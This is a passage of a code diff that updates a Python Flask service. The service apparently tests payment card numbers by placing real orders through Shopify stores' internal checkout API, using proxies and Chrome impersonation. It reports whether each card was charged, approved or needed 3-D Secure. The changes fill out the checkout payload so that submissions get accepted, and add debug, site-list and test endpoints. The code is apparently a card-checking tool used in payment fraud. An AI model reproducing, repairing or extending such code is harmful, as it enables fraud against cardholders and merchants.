-                        "merchandise": {"lines": [{          # ← FIX
+                        "merchandise": {"lines": [{
                             "stableId": stable_id,
                             "merchandise": {"productVariantReference": {
                                 "id":        f"gid://shopify/ProductVariantMerchandise/{vid}",
                                 "variantId": f"gid://shopify/ProductVariant/{vid}",
+                                "properties":        [],
+                                "sellingPlanId":     None,
+                                "sellingPlanDigest": None,
                             }},
-                            "quantity":           {"items": {"value": 1}},
-                            "expectedTotalPrice": {"any": True},
+                            "quantity":             {"items": {"value": 1}},
+                            "expectedTotalPrice":   {"any": True},
+                            "lineComponentsSource": None,
+                            "lineComponents":       [],
                         }]},
                         "memberships": {"memberships": []},
                         "payment": {
@@ -682,10 +664,25 @@ def _run_check(card_str, proxy_str):
                                 "paymentMethod": {
                                     "directPaymentMethod": {
                                         "sessionId":               sid,
-                                        "paymentMethodIdentifier": pm_id,   # ← FIX
+                                        "paymentMethodIdentifier": pm_id,
                                         "billingAddress":          {"streetAddress": sa},
                                         "cardSource":              None,
-                                    }
+                                    },
+                                    "giftCardPaymentMethod":                 None,
+                                    "redeemablePaymentMethod":               None,
+                                    "walletPaymentMethod":                   None,
+                                    "walletsPlatformPaymentMethod":          None,
+                                    "localPaymentMethod":                    None,
+                                    "paymentOnDeliveryMethod":               None,
+                                    "paymentOnDeliveryMethod2":              None,
+                                    "manualPaymentMethod":                   None,
+                                    "customPaymentMethod":                   None,
+                                    "offsitePaymentMethod":                  None,
+                                    "customOnsitePaymentMethod":             None,
+                                    "deferredPaymentMethod":                 None,
+                                    "customerCreditCardPaymentMethod":       None,
+                                    "paypalBillingAgreementPaymentMethod":   None,
+                                    "remotePaymentInstrument":               None,
                                 },
                                 "amount": {"value": {"amount": cur_total, "currencyCode": currency}},
                             }],
@@ -697,11 +694,28 @@ def _run_check(card_str, proxy_str):
                             "emailChanged":     False,
                             "phoneCountryCode": "US",
                             "marketingConsent": [],
+                            "shopPayOptInPhone": {"countryCode": "US"},
                             "rememberMe":       False,
                         },
+                        "tip": {"tipLines": []},
+                        "poNumber": None,
                         "taxes": {
-                            "proposedTotalAmount": {"value": {"amount": cur_tax, "currencyCode": currency}},
+                            "proposedAllocations":           None,
+                            "proposedTotalAmount":           {"value": {"amount": cur_tax, "currencyCode": currency}},
+                            "proposedTotalIncludedAmount":   None,
+                            "proposedMixedStateTotalAmount": None,
+                            "proposedExemptions":            [],
                         },
+                        "note": {"message": None, "customAttributes": []},
+                        "localizationExtension": {"fields": []},
+                        "nonNegotiableTerms": None,
+                        "scriptFingerprint": {
+                            "signature": None, "signatureUuid": None,
+                            "lineItemScriptChanges": [], "paymentScriptChanges": [],
+                            "shippingScriptChanges": [],
+                        },
+                        "optionalDuties": {"buyerRefusesDuties": False},
+                        "cartMetafields": [],
                     },
                     "attemptToken": f"{cart_token}-{_rand_suffix()}",
                     "metafields":   [],
@@ -711,7 +725,6 @@ def _run_check(card_str, proxy_str):
                 "id": submit_id,
             }
 
-        # ═══ FIX: submit with tax retry ═══
         body    = ""
         cur_tax = tax or "0.0"
         cur_tot = amount_f
@@ -723,8 +736,8 @@ def _run_check(card_str, proxy_str):
                     timeout=min(10, max(3, remain())),
                 )
                 body = r_submit.text
-            except Exception:
-                return _resp("PROPOSAL_FAILED")
+            except Exception as e:
+                return _fail("SUBMIT_EXC", shop=shop_url, err=str(e)[:100])
 
             if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in body and tax_attempt == 0:
                 nt = _tax_from_rejected(body)
@@ -737,13 +750,10 @@ def _run_check(card_str, proxy_str):
 
         elapsed_ms = (time.monotonic() - t_start) * 1000
 
-        # ── 7. Interpret ───────────────────────────────────────────────────
         if '"ProcessedReceipt"' in body or '"SuccessfulReceipt"' in body:
             return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=elapsed_ms)
-
         if '"ActionRequiredReceipt"' in body:
             return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=elapsed_ms)
-
         if '"FailedReceipt"' in body:
             resp, apv, chg = _classify_failed(_code(body))
             return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=elapsed_ms)
@@ -756,15 +766,11 @@ def _run_check(card_str, proxy_str):
                     if remain() < 3: break
                     time.sleep(0.4)
                     try:
-                        params = {
-                            "operationName": "PollForReceipt",
-                            "variables": json.dumps({"receiptId": rid, "sessionToken": rss}),
-                            "id": poll_id,
-                        }
-                        r_p = session.get(
-                            f"{shop_url}/checkouts/internal/graphql/persisted?{urlencode(params)}",
-                            headers=hdr, timeout=min(8, max(2, remain())),
-                        )
+                        params = {"operationName":"PollForReceipt",
+                                  "variables": json.dumps({"receiptId": rid, "sessionToken": rss}),
+                                  "id": poll_id}
+                        r_p = session.get(f"{shop_url}/checkouts/internal/graphql/persisted?{urlencode(params)}",
+                                          headers=hdr, timeout=min(8, max(2, remain())))
                         pb = r_p.text
                         if '"SuccessfulReceipt"' in pb or '"ProcessedReceipt"' in pb:
                             ms = (time.monotonic() - t_start) * 1000
@@ -785,10 +791,10 @@ def _run_check(card_str, proxy_str):
             resp, apv, chg = _classify_failed(code)
             return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=elapsed_ms)
 
-        return _resp("PROPOSAL_FAILED", price=price_str, elapsed_ms=elapsed_ms)
+        return _fail("UNKNOWN_BODY", shop=shop_url, body=body[:800], price=price_str)
 
     except Exception as e:
-        return _resp(f"ERROR_{str(e)[:40]}")
+        return _fail("TOP_EXC", shop=shop_url, err=str(e)[:150])
     finally:
         try: session.close()
         except Exception: pass
@@ -805,7 +811,7 @@ def route_check():
         if not card: return _resp("MISSING_CARD")
         return _run_check(card, proxy)
     except Exception as e:
-        return _resp(f"ERROR_{str(e)[:40]}")
+        return _fail("ROUTE_EXC", err=str(e)[:150])
     finally:
         _dec_busy()
 
@@ -814,10 +820,37 @@ def route_health():
     with _workers_lock: busy = _workers_busy
     return jsonify({"status":"ok","workers_busy":busy,"workers_cap":WORKERS_CAP})
 
-# ═══ FIX: diagnostic endpoint ═══
 @app.route("/debug")
 def route_debug():
-    return jsonify(_last_failure if _last_failure else {"ok": "no failure recorded yet"})
+    return jsonify(_last_failure if _last_failure else {"ok": "no failure recorded"})
+
+@app.route("/sites")
+def route_sites():
+    sites = _get_sites()
+    return jsonify({
+        "source": "env:SITES" if os.environ.get("SITES") else "file:site.txt",
+        "count":  len(sites),
+        "sites":  sites[:20],
+    })
+
+@app.route("/test")
+def route_test():
+    sites = _get_sites()
+    if not sites:
+        return jsonify({"error": "no sites configured", "env_set": bool(os.environ.get("SITES"))})
+    shop_url = sites[0]
+    try:
+        sess = requests.Session(impersonate="chrome124")
+        t0 = time.time()
+        r  = sess.get(f"{shop_url}/products.json?limit=5", timeout=10)
+        return jsonify({
+            "shop": shop_url,
+            "status": r.status_code,
+            "elapsed_ms": int((time.time() - t0) * 1000),
+            "products_count": len(r.json().get("products", [])) if r.status_code == 200 else 0,
+        })
+    except Exception as e:
+        return jsonify({"shop": shop_url, "error": str(e)[:200]})
 
 # ─────────────────────────────────────────────────────────────────────────────
 # ▶️ ENTRY
